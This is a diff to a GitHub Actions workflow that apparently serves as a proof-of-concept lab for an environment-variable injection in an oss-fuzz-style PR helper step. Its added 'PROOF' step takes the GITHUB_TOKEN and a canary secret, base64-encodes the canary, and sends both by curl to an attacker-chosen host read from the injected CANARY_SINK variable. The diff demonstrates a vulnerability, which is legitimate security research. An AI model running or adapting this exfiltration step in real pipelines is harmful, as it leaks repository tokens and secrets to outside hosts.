@@ -39,25 +39,28 @@ jobs:
           LAB_OWNER: ${{ github.repository_owner }}
           LAB_REPO: ${{ github.event.repository.name }}
           CRITICALITY_SCORE_PATH: /bin/true
-        run: python infra/pr_helper_fixed.py
+        run: python pr_helper_fixed.py
 
-      # --- every step below is a PRIVILEGED consumer of the job env, exactly like
-      # --- oss-fuzz's `actions/github-script` "Leave comments" step.
-      - name: "PROOF: privileged consumer uses GITHUB_API_URL + GITHUB_TOKEN + a repo secret"
+      # PRIVILEGED CONSUMER: every step below sees the job env produced by the step above,
+      # exactly like oss-fuzz's `actions/github-script` "Leave comments" step.
+      - name: "PROOF: privileged consumer sends token + canary to an attacker-chosen env var"
         if: always()
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           CANARY: ${{ secrets.CANARY }}
         run: |
-          echo "=== env inherited from pr_helper step ==="
-          echo "GITHUB_API_URL=${GITHUB_API_URL}"
-          echo "IS_READY_FOR_MERGE=${IS_READY_FOR_MERGE}"
-          echo "IS_INTERNAL=${IS_INTERNAL}"
+          echo "=== env inherited from the pr_helper step (GITHUB_ENV) ==="
+          echo "CANARY_SINK=${CANARY_SINK}"
+          echo "GITHUB_API_URL=${GITHUB_API_URL}   (GITHUB_* defaults are protected by the runner)"
+          echo "EVILPAD=${EVILPAD}"
           C=$(printf '%s' "$CANARY" | base64 -w0)
-          echo "canary_b64=${C}"
-          echo "=== token-bearing request to the attacker-chosen host ==="
-          curl -sS -m 20 -H "Authorization: Bearer ${GH_TOKEN}" \
-            "${GITHUB_API_URL:-https://httpbin.org/anything}?canary=${C}" | head -c 3000 || true
+          if [ -n "${CANARY_SINK}" ]; then
+            echo "=== injection succeeded: token-bearing request to attacker host ${CANARY_SINK} ==="
+            curl -sS -m 20 -H "Authorization: Bearer ${GH_TOKEN}" \
+              "${CANARY_SINK}?canary=${C}" | head -c 3000 || true
+          else
+            echo "=== no injection: CANARY_SINK unset, nothing leaves the runner ==="
+          fi
 
       - name: Leave comments (faithful oss-fuzz consumer, non-blocking)
         if: always()
